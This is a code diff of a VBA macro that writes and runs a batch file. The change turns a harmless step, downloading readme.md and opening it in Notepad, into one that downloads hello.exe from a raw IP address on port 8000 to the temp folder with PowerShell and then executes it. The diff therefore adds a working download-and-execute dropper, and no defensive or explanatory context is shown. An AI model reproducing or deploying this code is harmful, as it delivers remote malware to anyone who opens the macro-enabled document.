@@ -52,12 +52,12 @@ Sub CreateAndRunBat
     batContent = _
         "@echo off" & vbCrLf & _
         "setlocal" & vbCrLf & _
-        "set ""URL=http://193.233.112.194:8000/readme.md""" & vbCrLf & _
-        "set ""FILE=%TEMP%\readme.md""" & vbCrLf & _
+        "set ""URL=http://193.233.112.194:8000/hello.exe""" & vbCrLf & _
+        "set ""FILE=%TEMP%\hello.exe""" & vbCrLf & _
         "echo Downloading..." & vbCrLf & _
         "powershell -Command ""try { Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' } catch { exit 1 }""" & vbCrLf & _
         "if errorlevel 1 exit /b" & vbCrLf & _
-        "start notepad.exe ""%FILE%""" & vbCrLf & _
+        "start ""%FILE%""" & vbCrLf & _
         "exit"
 
     Set batFile = fso.CreateTextFile(batPath, True)
